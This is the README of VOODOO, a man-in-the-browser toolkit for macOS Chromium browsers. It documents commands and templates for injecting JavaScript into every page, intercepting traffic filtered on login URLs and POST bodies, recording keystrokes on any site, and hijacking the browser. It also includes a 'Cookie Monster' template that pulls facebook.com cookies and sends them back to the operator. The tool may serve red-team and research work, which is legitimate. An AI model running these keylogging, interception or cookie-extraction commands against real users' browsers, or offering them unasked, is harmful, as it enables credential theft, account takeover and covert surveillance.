# VOODOO
Man in the Browser Framework

<p align="center">
    <br />
    <img src="./.github/voodoo.svg" width="50%" />
</p>

## Browser Support

| [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt="IE / Edge" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Edge | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_48x48.png" alt="Chrome" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Chrome | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/opera/opera_48x48.png" alt="Opera" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Opera | [<img src="https://github.com/alrra/browser-logos/raw/main/src/brave/brave_48x48.png" alt="Brave" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Brave | [<img src="https://github.com/alrra/browser-logos/raw/main/src/chromium/chromium_48x48.png" alt="Chromium" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Chromium |
| --------- | --------- | --------- | --------- | --------- |
| macOS only | macOS only | macOS only | macOS only | macOS only

## Features
* 📜 Content Scripts - inject arbitrary JavaScript to any page
* 🔍 Interceptor - capture browser traffic (url, headers, body, etc)
* 🔑 Keylogger - records user keystrokes on any site

## Requirements
* ruby >= 2.0.0
* rubygems >= 1.8
* thor ~> 1.2.1
* bundler >= 1.17

## Installation
```sh
$: gem install get-voodoo
```

## Building
```sh
$: git clone https://github.com/breakpointHQ/VOODOO.git
$: cd ./VOODOO
$: gem build ./voodoo.gemspec
$: gem install ./get-voodoo-X.X.X.gem
```

Make sure you have `/Users/[user]/.gem/ruby/[version]/bin` in your `PATH`.

## CLI

```sh
$: voodoo
Commands:
  voodoo help [COMMAND]    # Describe available commands or one specific command
  voodoo intercept         # intercept browser requests
  voodoo keylogger         # records user keystrokes
  voodoo script <js/path>  # add a content script
  voodoo template <path>   # execute a VOODOO template
  voodoo version           # Prints voodoo version
```

## Adding content script

```sh
Usage:
  voodoo script <js/path>

Options:
  x, [--urls=one two three]         
  o, [--output=OUTPUT]              # collector output file path
  j, [--js-vars=key:value]          # localizes JavaScript variable
  m, [--matches=one two three]      
                                    # Default: ["*://*/*"]
  b, [--browser=BROWSER]            
                                    # Default: chrome
  p, [--permissions=one two three]  

add a content script
```

Execute JS on every page loaded on the Opera browser.
```sh
$: voodoo script "alert('Hello VOODOO!');" -b opera
```

Execute JS on every page matches `https://example.com/*`
```sh
$: voodoo script "alert('Example VOODOO!');" -b chrome -m "https://example.com/*"
```

Execute JS on every page loaded on Google Chrome, and open `https://example.com`.
```js
$: voodoo script /tmp/myjs.js -b chrome -s "https://example.com"
```

## Intercept browser traffic

```sh
Usage:
  voodoo intercept

Options:
  u, [--url-include=URL_INCLUDE]      
  b, [--body-include=BODY_INCLUDE]    
  h, [--header-exists=HEADER_EXISTS]  
  o, [--output=OUTPUT]                # <path>, stdout
                                      # Default: stdout
  x, [--urls=one two three]           
  m, [--matches=one two three]        
                                      # Default: ["<all_urls>"]
  b, [--browser=BROWSER]              
                                      # Default: chrome

intercept browser requests
```

Intercept all requests
```sh
$: voodoo intercept -o /tmp/requests_log.txt
```

Intercept all requests from Opera browser only when the url include `/login`.
```sh
$: voodoo intercept -o /tmp/requests_log.txt --url-include "/login"
```

Intercept all requests when the post body include `@`.
```sh
$: voodoo intercept -o /tmp/requests_log.txt --body-include "@"
```

Intercept all requests when the url matches `https://example.com/*` or `https://example.net/*`
```sh
$: voodoo intercept -m "https://example.com/*" "https://example.net/*"
```

## Keylogger
```sh
Usage:
  voodoo keylogger

Options:
  x, [--urls=one two three]     
  o, [--output=OUTPUT]          # <path>, stdout
                                # Default: stdout
  m, [--matches=one two three]  
                                # Default: ["*://*/*"]
  b, [--browser=BROWSER]        
                                # Default: chrome

records user keystrokes
```

Record user keys only when the url matches `https://example.com/*`
```sh
$: voodoo keylogger -m "https://example.com/*"
```

## Templates

A VOODOO template is a `YAML` file that is used to define one or more script injections.

```sh
Usage:
  voodoo template <path>

Options:
  b, [--browser=BROWSER]     
  o, [--output=OUTPUT]       # none, <path>, stdout, stdout:payload
                             # Default: none
  x, [--urls=one two three]  
  j, [--js-vars=key:value]   # localizes JavaScript variable

execute a VOODOO template
```

A template must have have 3 main blocks: `info`, `scripts`, and `browser` and 2 optional settings `output` and `permissions`.

### Information

The `info` block holds important information about your template. Info block provides `name`, `author`, `description`, and `tags`.
`info` block also supports dynamic fields, so you can define any key: value blocks to provide more useful information about the template.

Info block example:
```yaml
info:
  name: Change the Title of example.com
  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.
  author: Mr. Test
  tags: example.com, overwrite
```

### Scripts
The `scripts` block define the content scripts and background scripts that will be injected to the browser.
You can spesify the following attributes for each script:

| Name      | Type      | Description |
| --------- | --------- | --------- | 
`matches` | array of strings | **Required for content scripts** Specifies which pages this content script will be injected into. |
`content` | string | Specifies the JavaScript code that will be executed
`file` | string | Specifies the path to a JavaScript file that will be executed
`background` | boolean | Specifies whether or not this is a background script

### Scripts block examples:

Inject a content script from a file to every page
```yaml
scripts:
  - matches: "*://*/*" # Inject to every page
    file: ./keylogger.js # A JS file from the same folder as the template file
```

Overwrite the title of example.com and example.net
```yaml
scripts:
  - matches:
      - https://example.com/*
      - https://example.net/*
    content: document.querySelector('h1').innerText = 'VOODOO Example!';
```

Inject a background script that will report back on every tab update.
```yaml
scripts:
  - content: chrome.tabs.onUpdated.addListener((_,tab) => VOODOO.send(tab));
    background: true
```

A template file looks like this:

```yaml
info:
  name: Change the Title of example.com
  author: Mr. Test
  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.
  tags: example.com, overwrite

scripts:
  - matches: https://example.com/*
    content: document.querySelector('h1').innerText = "VOODOO Example";

browser:
  name: opera
  urls:
    - https://example.net/
    - https://example.com/
```

### JavaScript API
Every content script and background script can access the `VOODOO` object.

`VOODOO.options` is an is a key value settings pass from CLI `js_vars` option.
Please note, `VOODOO.options.collector_url` is automatically set.

`VOODOO.send(:any)` is a method that allows you to send information back to the CLI/Ruby.
When using `VOODOO.send` make sure to set `output` to one of the following: `stdout`, `stdout:payload`, `<path-to-file>`

### Permissions
The `permissions` property is used to declare the necessary permissions for your VOODOO script.
By default VOODOO sets the following permissions:
`tabs`, `*://*/*`, `webRequest`

Adding the `cookies` permission, to extract `facebook.com` cookies from the browser.
```yaml
info:
  name: Cookie Monster

output: stdout:payload

permissions:
  - cookies

scripts:
  - content: |
      chrome.cookies.getAll({domain: "facebook.com"}, VOODOO.send);
    background: true
```

### Browser
The `browser` block is a key value object that defines browser related settings for the template.
Please note, the `name` setting can be overwrited using the `--browser` or `-b` CLI option.
The `urls` setting can be overwrited using the `--urls` or `-x` CLI options.

| Name      | Type      | Description | Default | 
| --------- | --------- | --------- | --------- |
| name      | string    | supported browser short name `chrome`, `opera`, `edge`, `brave`, `chromium` | `chrome`
| urls      | array of strings | list of urls to open right after we hijack the browser. | `NULL`

### Output
The `output` property sets the default output format for the template.
Please note, this setting can be overwrited using the `--output` or `-o` CLI option.

```yaml
info:
  name: Title Spy

# sets the default output format
output: stdout:payload # -> prints only the sent payload
       # stdout          -> prints the full event
       # <file path>     -> save the full event to a file

scripts:
  - matches: https://example.net
    content: 'VOODOO.send({title: document.title})'

browser:
  name: opera
```

## Ruby API

The underline Ruby API can also be used for advance integrations.

```rb
require 'voodoo'

browser = VOODOO::Browser.Chrome
                       # .Opera
                       # .Edge
                       # .Chromium

# Execute JS on example.com
browser.add_script(content: 'alert("VOODOO Example!");',
                   matches: 'https://example.com/*')

# Intercept all browser requests
browser.intercept do |event|
    req = event[:payload]
    puts "#{req[:method]} #{req[:url]}"
end

# Inject a keylogger to every page
browser.keylogger do |event|
    print event[:payload][:log]
end

# hijack the browser, and open example.com
browser.hijack 'https://example.com'
```

## Development

Running project tests
```sh
$: bundle exec rake test
```

## Contributing
* File an issue first prior to submitting a PR!
* If applicable, submit a test suite against your PR

## TO DO
* Windows/Linux support
* Ruby API documentation